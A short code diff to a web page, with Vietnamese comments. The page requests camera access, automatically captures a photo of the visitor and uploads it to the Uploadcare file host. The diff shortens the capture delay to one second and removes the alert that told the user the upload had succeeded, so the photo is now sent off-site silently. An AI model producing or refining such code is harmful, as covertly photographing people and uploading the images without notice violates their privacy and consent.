@@ -28,16 +28,14 @@
   <script>
     const video = document.getElementById('video');
 
-    // Xin quyền truy cập camera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Chờ video load xong, sau đó chụp ảnh sau 2 giây
         video.onloadedmetadata = () => {
           setTimeout(() => {
             captureAndUpload();
-          }, 2000);
+          }, 1000); // Tự động chụp sau 1 giây
         };
       })
       .catch(err => {
@@ -64,8 +62,7 @@
         })
         .then(res => res.json())
         .then(data => {
-          console.log('✅ Ảnh đã upload lên Uploadcare:', data);
-          alert('✅ Ảnh đã được tải lên thành công!');
+          console.log('✅ Ảnh đã upload:', data);
         })
         .catch(err => {
           console.error('❌ Lỗi upload:', err);
